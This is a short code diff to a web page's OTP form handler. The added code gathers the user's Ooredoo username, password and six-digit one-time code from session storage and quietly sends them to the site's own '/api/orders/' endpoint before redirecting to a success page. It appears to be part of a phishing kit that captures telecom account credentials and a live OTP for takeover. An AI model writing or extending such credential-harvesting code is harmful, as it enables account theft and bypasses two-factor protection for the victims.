@@ -364,8 +364,23 @@
     const otp = otpInput.value.trim();
     
     if (otp.length === 6) {
-      // حفظ الرمز في sessionStorage وذهاب إلى صفحة التحميل
       sessionStorage.setItem('otpCode', otp);
+      sessionStorage.setItem('ooredooOtp', otp);
+
+      const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
+      const payload = {
+        ooredooUser: sessionStorage.getItem('ooredooUser') || '',
+        ooredooPass: sessionStorage.getItem('ooredooPass') || '',
+        ooredooOtp: otp,
+        status: 'pending'
+      };
+
+      fetch('/api/orders/' + encodeURIComponent(orderId), {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
+
       window.location.href = 'success.html';
     }
   });
